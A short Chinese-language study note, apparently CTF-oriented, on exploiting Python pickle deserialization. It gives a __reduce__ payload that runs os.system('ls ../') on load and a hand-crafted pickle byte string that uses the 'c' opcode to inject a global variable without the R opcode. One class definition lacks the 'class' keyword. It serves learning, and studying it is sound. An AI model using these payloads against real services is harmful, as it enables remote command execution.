python反序列化

笔记
  • python

没有ban掉R指令码。可使用reduce, 在本地加上__reduce__ 在把序列化后的字符串发送给正常接收端即可执行命令。

import pickle 
import os 
import pickletools

T1(object):
    def __init__(self, f1):
     self.foo1 = f1
     
     
    def  __reduce__(self): 
        return(os.system, ('ls ../',))
        
a = T1('1')
b = pickle.dumps(a)
pickle.loads(b)

使用全局变量替换值,可以不使用R指令

import pickle
import os
import pickletools

class T1(object):
    def __init__(self, f1):
        self.foo1 = f1

t = 'test'
foo1 = T1('hello')
se1 = pickle.dumps(foo1)
# res1 = b'\x80\x03c__main__\nT1\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00foo1q\x03X\x05\x00\x00\x00helloq\x04sb.'
unse = pickle.loads(se1)
print(unse.foo1)  # hello

se2 = b'\x80\x03c__main__\nT1\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00foo1c__main__\nt\nq\x04sb.'
b = pickle.loads(se2)
print(b.foo1)  # test

将我们的输入的变量替换成c指令。格式 cmodule``\n``name``\n

替换内容
`foo1q\x03X\x05\x00\x00\x00helloq\x04sb.`
`foo1c__main__\nt\nq\x04sb.`
这样替换后T1类里的foo1值将接收的是全局变量t的值
